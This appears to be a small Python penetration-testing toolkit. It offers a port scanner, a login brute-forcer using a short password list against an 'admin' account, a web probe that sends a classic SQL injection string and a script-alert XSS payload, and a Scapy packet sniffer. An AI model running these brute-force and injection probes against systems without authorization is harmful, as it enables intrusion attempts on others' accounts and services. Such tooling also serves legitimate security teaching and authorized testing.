import argparse
import socket
import requests

# Check for Scapy module
try:
    from scapy.all import sniff
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Validate Target
def resolve_target(target):
    try:
        return socket.gethostbyname(target)
    except socket.gaierror:
        print(f"[!] Error: Invalid target '{target}'. Check the hostname or IP.")
        exit(1)

# Port Scanner
def scan_ports(target):
    target_ip = resolve_target(target)
    print(f"[*] Scanning target: {target_ip}")
    common_ports = [22, 80, 443, 3306, 8080]

    for port in common_ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            result = s.connect_ex((target_ip, port))
            if result == 0:
                print(f"[+] Open Port: {port}")

    print("[-] Scan completed.")

# Brute-Force Attack
def attack_login(target_url):
    wordlist = ["admin", "password", "123456", "qwerty"]
    print(f"[*] Brute-forcing {target_url}...")

    for password in wordlist:
        try:
            data = {"username": "admin", "password": password}
            response = requests.post(target_url, data=data, timeout=5)
            
            if "incorrect" not in response.text.lower():
                print(f"[+] Success: Username: admin | Password: {password}")
                return
        except requests.exceptions.RequestException:
            print("[!] Connection error. Check the URL.")
            return

    print("[-] No valid credentials found.")

# Web Vulnerability Scanner
def scan_web(target_url):
    print(f"[*] Scanning {target_url} for vulnerabilities...")

    try:
        sqli_payload = "' OR '1'='1"
        response = requests.get(target_url + "?id=" + sqli_payload, timeout=5)
        if any(keyword in response.text.lower() for keyword in ["sql syntax", "mysql_fetch"]):
            print("[!] SQL Injection detected!")

        xss_payload = "<script>alert(1)</script>"
        response = requests.get(target_url + "?msg=" + xss_payload, timeout=5)
        if xss_payload in response.text:
            print("[!] XSS Vulnerability detected!")

    except requests.exceptions.RequestException:
        print("[!] Connection error. Check the URL.")
        return

    print("[-] Scan completed.")

# Network Sniffer
def packet_callback(packet):
    if packet.haslayer("Raw"):
        print(f"[!] Captured Packet: {packet.summary()}")

def start_sniffer():
    if not SCAPY_AVAILABLE:
        print("[!] Error: Scapy is not installed. Run 'pip install scapy'")
        return

    print("[*] Starting network sniffer...")
    sniff(prn=packet_callback, count=10)

# CLI Argument Parsing
def main():
    parser = argparse.ArgumentParser(description="Python-Based Penetration Testing Toolkit")
    parser.add_argument("-t", "--target", help="Target IP or URL", default="localhost")
    parser.add_argument("-m", "--module", choices=["portscan", "bruteforce", "webscan", "sniffer"], help="Choose a module", default="portscan")

    args = parser.parse_args()

    print(f"[*] Running {args.module} on {args.target}")

    if args.module == "portscan":
        scan_ports(args.target)
    elif args.module == "bruteforce":
        attack_login(args.target)
    elif args.module == "webscan":
        scan_web(args.target)
    elif args.module == "sniffer":
        start_sniffer()

if __name__ == "__main__":
    main()
